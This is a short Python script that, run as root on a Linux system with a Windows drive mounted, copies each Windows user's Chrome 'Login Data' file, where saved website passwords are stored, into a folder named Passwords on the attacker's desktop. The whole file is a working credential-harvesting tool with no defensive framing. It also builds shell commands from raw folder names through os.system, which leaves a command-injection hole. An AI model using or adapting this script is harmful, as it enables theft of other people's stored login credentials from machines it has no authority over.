#!/usr/bin/env python3
WindowsUserDirectory="/media/root/OS/Users"
prefix=""
googleDirectory="" #default
prefixFlag=False
import os
currDir=os.popen('pwd').read().strip()
os.system('ls '+WindowsUserDirectory+' >> '+currDir+'/users')
fin=open('users')
data=fin.readlines()
usernames=[]
for i in data:
    if str(i)[:2]==prefix or not prefixFlag:
        usernames.append(i.strip())
fin.close()
try:
	os.system('mkdir /root/Desktop/Passwords')
except:
	pass
#print(usernames)
for i in usernames:
    try:
        os.system("cp '"+WindowsUserDirectory+"/"+i+"/AppData/Local/Google/Chrome/User Data/Default/Login Data' '/root/Desktop/Passwords/"+i+"'")
    except:
        pass
